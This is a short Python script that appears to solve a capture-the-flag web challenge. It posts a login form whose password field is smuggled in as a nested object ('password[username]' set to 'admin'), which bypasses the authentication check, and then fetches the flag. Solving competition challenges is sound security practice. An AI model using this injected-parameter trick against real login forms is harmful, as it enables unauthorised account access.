import requests

url = "https://log-me-in.web.ctfcompetition.com/"
s=requests.Session()
r = s.post(url+"login", data = {
	"username" :"michelle",
	"password[username]" : "admin",
	})
r = s.get(url+"flag")
print(r.text)
s.close()